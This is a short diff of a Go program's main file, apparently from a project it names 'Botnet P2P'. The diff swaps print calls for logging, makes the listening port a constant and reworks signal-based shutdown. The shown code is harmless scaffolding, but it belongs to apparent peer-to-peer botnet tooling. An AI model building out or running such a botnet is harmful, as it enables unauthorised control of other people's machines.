@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"os"
 	"os/signal"
 	"log"
@@ -9,19 +8,19 @@ import (
 )
 
 func main() {
-	fmt.Println("Botnet P2P")
+	log.Println("Botnet P2P booting...")
 	nat, _ := checkNAT()
-	terminate := make(chan bool)
-	fmt.Printf("NAT: %t\n", nat)
+	terminate := make(chan struct{})
+	log.Printf("NAT: %t\n", nat)
 	go exitHandler(terminate)
-	serverRoutine(6666, terminate)
+	serverRoutine(defaultPort, terminate)
 }
 
-func exitHandler(term chan bool) {
+func exitHandler(term chan struct{}) {
 	signalChannel := make(chan os.Signal, 3)
 	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
 	<-signalChannel
-	term<-true
-	log.Println("App terminated!")
-	os.Exit(0)
+	close(term)
+	log.Println("Terminate signal received!")
+	//os.Exit(0)
 }
